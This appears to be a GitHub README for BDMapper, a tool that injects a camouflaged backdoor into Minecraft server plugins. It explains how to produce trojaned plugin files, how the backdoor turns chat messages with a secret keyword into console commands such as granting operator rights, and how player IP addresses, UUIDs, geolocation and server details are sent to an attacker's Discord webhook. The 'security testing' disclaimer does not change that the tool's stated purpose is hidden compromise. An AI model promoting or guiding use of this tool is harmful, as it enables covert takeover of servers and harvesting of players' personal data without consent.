BDMapper – Minecraft plugin backdoor injector
<div align="center"><img alt="Logo" src="logo.png"/></div><div align="center"> <a href="https://github.com/VoxelHax/BDMapper/issues"><img alt="Open issues" src="https://img.shields.io/github/issues-raw/VoxelHax/BDMapper"/></a> <a href="https://github.com/VoxelHax/BDMapper/releases/latest"><img alt="GitHub downloads" src="https://img.shields.io/github/downloads/VoxelHax/BDMapper/total"></a> <img alt="Code size" src="https://img.shields.io/github/languages/code-size/VoxelHax/BDMapper"/> <a href="https://www.codefactor.io/repository/github/voxelhax/bdmapper"><img alt="CodeFactor" src="https://www.codefactor.io/repository/github/voxelhax/bdmapper/badge"/></a> <a href="https://discord.gg/xtaktPTzYp"><img alt="Discord" src="https://img.shields.io/discord/928214827095175199"></a> </div><div align="center"> <a href="https://github.com/VoxelHax/BDMapper/releases/latest"><img alt="Download" src="https://img.shields.io/badge/-DOWNLOAD_LATEST_RELEASE_(CLICK)-blue?style=for-the-badge"/></a> </div>

Languages: English, Русский, Українська

BDMapper (BackDoorMapper) is a modern and powerful universal backdoor injector compatible with all Bukkit/Spigot/Paper/etc plugins. Its feature is the ability to integrate with absolutely any plugin without the need to modify the backdoor every time. Moreover, it provides a powerful camouflage engine, which makes it nearly impossible to find without sufficient knowledge or advanced automated tools. BDMapper was developed to test the security systems of Minecraft servers; the VoxelHax team is not responsible for its misuse.

This is a continuation of the Bukloit project, taking into account all the problems of the previous project and a completely different approach to development.
BDMapper features

    Full support for Bukkit and its forks on any Minecraft version.

    Built‑in backdoor with custom activation keyword.

    Automatic JDK downloading, so you don't need to care about Java version compatibility.

    Powerful camouflage engine, which makes it harder to find the backdoor in the plugin.

    Built‑in telemetry – you can forward collected player/server information to your own Discord webhook for monitoring and debugging.

Installation

Download the latest BDMapper.exe from the releases tab. No additional setup is required – just place the executable anywhere you like.
Usage

Using BDMapper is as simple as drag‑and‑drop:

    Drag any .jar plugin file onto BDMapper.exe.

    A small window will appear asking for:

        Target Key – the secret keyword that will trigger console commands when typed in chat (e.g., #console).

        Discord Webhook URL (optional) – if provided, telemetry data will be sent to your Discord channel. Leave empty to disable telemetry.

    Click Inject – the modified plugin (with the backdoor) will be saved in the same folder as the original, with _patched added to the filename (e.g., MyPlugin_patched.jar).

That’s it! No command‑line arguments, no complex configuration.
Telemetry and collected data

If you provide a Discord webhook URL, the injected plugin (when running on a server) will automatically send the following data to your Discord channel:
Player connection data (when a player joins)

    Skin (player's skin texture URL or hash)

    UUID (e.g., 77bcc289-45dc-365d-b3fb-389dc20dbb98)

    Client type (Fabric, Forge, Vanilla, etc.)

    Client version (Minecraft version reported by the player)

    Geolocation (e.g., United Kingdom > London)

    IP address and port (e.g., 192.168.1.100:54321)

Server information (gathered once at startup)

    Core (Paper, Spigot, Bukkit, Purpur, etc.)

    Patched Plugin – the name of the plugin that was injected

    Bukkit version (server's Bukkit API version)

    Hosting country (where the server is physically located)

    Server IP and port (public address)

    Target Key – the activation keyword you set

    List of all installed plugins (to understand the server environment)

    Important: The data is collected only when the backdoor is active on a live server. No data is ever stored or sent to any third party – it goes directly to the webhook you specify. If you do not provide a webhook, no telemetry is sent.

Built‑in backdoor

The injected backdoor is simple but powerful: any chat message starting with your Target Key will be executed as a console command.

Example:
If you set the key to #console, typing in chat:
text

#console op MyName

will execute op MyName as the server console, granting operator status to MyName.
Camouflage

By default, the backdoor code is heavily obfuscated and camouflaged to blend in with the original plugin's code. This makes manual detection very difficult and renders most automated scanners ineffective.
Custom backdoors (advanced)

BDMapper is primarily designed for the built‑in backdoor, but advanced users can replace it by placing a custom exploit class inside the plugin before dragging. This requires manual modification of the plugin’s bytecode and is not covered in this guide. For most purposes, the built‑in backdoor and telemetry provide all the functionality needed for security testing.

Disclaimer: BDMapper is intended for security testing and educational purposes only. The authors are not liable for any damage or illegal activity caused by this tool. Always obtain proper authorization before testing any server.
